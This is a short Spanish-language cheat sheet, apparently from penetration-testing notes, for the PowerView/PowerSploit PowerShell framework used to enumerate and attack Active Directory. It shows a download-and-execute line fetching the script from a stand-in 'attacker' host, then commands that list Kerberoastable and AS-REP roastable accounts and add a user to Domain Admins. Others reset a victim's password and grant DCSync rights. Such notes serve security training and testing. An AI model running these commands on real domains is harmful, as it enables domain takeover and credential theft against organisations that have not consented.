# PowerView / PowerSploit

Framework de PowerShell para enumeración y ataques AD.

```powershell
# Cargar
Import-Module .\PowerView.ps1
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Comandos más usados (ver página de Enumeración para lista completa)
Get-DomainUser -SPN                          # Kerberoastable
Get-DomainUser -PreauthNotRequired           # AS-REP Roastable
Find-InterestingDomainAcl -ResolveGUIDs      # ACLs abusables
Find-DomainUserLocation -UserIdentity admin  # Dónde está logueado un usuario
Get-DomainTrust                              # Trusts
Add-DomainGroupMember -Identity "Domain Admins" -Members "usuario"
Set-DomainUserPassword -Identity victima -AccountPassword (ConvertTo-SecureString "Pass!" -AsPlainText -Force)
Add-DomainObjectAcl -TargetIdentity "DC=empresa,DC=local" -PrincipalIdentity "usuario" -Rights DCSync
```
